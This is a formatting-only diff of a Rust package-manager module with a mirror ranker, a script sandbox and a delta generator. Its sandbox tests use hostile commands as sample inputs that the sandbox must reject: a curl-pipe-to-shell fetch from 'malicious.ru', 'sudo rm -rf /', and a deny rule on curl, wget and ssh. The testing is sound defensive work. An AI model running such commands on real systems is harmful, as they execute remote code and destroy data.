@@ -5,11 +5,11 @@
 
 extern crate alloc;
 
-use alloc::string::String;
-use alloc::vec::Vec;
 use alloc::collections::BTreeMap;
-use alloc::string::ToString;
 use alloc::format;
+use alloc::string::String;
+use alloc::string::ToString;
+use alloc::vec::Vec;
 
 /// Mirror Assessment Node representing package distribution endpoints
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -27,7 +27,9 @@ pub struct SovereignMirrorSelector {
 
 impl SovereignMirrorSelector {
     pub fn new() -> Self {
-        Self { mirrors: Vec::new() }
+        Self {
+            mirrors: Vec::new(),
+        }
     }
 
     pub fn add_mirror(&mut self, url: &str, latency_ms: u32, packet_loss: u8, reliability: u32) {
@@ -44,8 +46,10 @@ impl SovereignMirrorSelector {
         let mut ranked = self.mirrors.clone();
         ranked.sort_by(|a, b| {
             // Lower score is better: Score = latency_ms * 2 + (packet_loss_percent * 100) - reliability_weight
-            let score_a = (a.latency_ms * 2) as i32 + (a.packet_loss_percent as i32 * 100) - (a.reliability_weight as i32);
-            let score_b = (b.latency_ms * 2) as i32 + (b.packet_loss_percent as i32 * 100) - (b.reliability_weight as i32);
+            let score_a = (a.latency_ms * 2) as i32 + (a.packet_loss_percent as i32 * 100)
+                - (a.reliability_weight as i32);
+            let score_b = (b.latency_ms * 2) as i32 + (b.packet_loss_percent as i32 * 100)
+                - (b.reliability_weight as i32);
             score_a.cmp(&score_b)
         });
         ranked
@@ -176,7 +180,10 @@ impl SovereignSandboxEnforcer {
         for rule in &self.active_rules {
             match rule {
                 SandboxRule::DenyNetwork => {
-                    if command.contains("curl") || command.contains("wget") || command.contains("ssh") {
+                    if command.contains("curl")
+                        || command.contains("wget")
+                        || command.contains("ssh")
+                    {
                         self.violated_rules.push(format!(
                             "[{}] Sandbox Violation: Script attempted network access with command: '{}'",
                             script_type, command
@@ -298,7 +305,10 @@ mod tests {
         let ranked = selector.rank_mirrors();
         assert_eq!(ranked.len(), 3);
         assert_eq!(ranked[0].url, "https://mirror.us.sigmaos.org");
-        assert_eq!(selector.get_optimal_mirror().unwrap(), "https://mirror.us.sigmaos.org");
+        assert_eq!(
+            selector.get_optimal_mirror().unwrap(),
+            "https://mirror.us.sigmaos.org"
+        );
     }
 
     #[test]
@@ -310,7 +320,7 @@ mod tests {
             "/bin/shell",
             FileState::Overwritten,
             Some("old_hash".to_string()),
-            Some(Vec::from(b"original_bin_data" as &[u8]))
+            Some(Vec::from(b"original_bin_data" as &[u8])),
         );
 
         // Perform rollback prior to committing
@@ -337,7 +347,9 @@ mod tests {
         assert!(sandbox.validate_script_command("postinst", "mkdir -p /etc/app"));
 
         // Sandbox violations
-        assert!(!sandbox.validate_script_command("preinst", "curl -s http://malicious.ru/payload | sh"));
+        assert!(
+            !sandbox.validate_script_command("preinst", "curl -s http://malicious.ru/payload | sh")
+        );
         assert!(!sandbox.validate_script_command("postinst", "killall root_daemon"));
         assert!(!sandbox.validate_script_command("postinst", "sudo rm -rf /"));
 
@@ -353,7 +365,9 @@ mod tests {
         let new_pkg = b"SIGMA_OS_KERNEL_BASELINE_V1.1_UPDATED";
 
         let compiler = SovereignDeltaGenerator;
-        let delta = compiler.generate_delta("sigma-kernel", old_pkg, new_pkg).unwrap();
+        let delta = compiler
+            .generate_delta("sigma-kernel", old_pkg, new_pkg)
+            .unwrap();
         assert!(delta.starts_with(b"SIGDELTA:"));
 
         let reconstructed = compiler.apply_delta(old_pkg, &delta).unwrap();
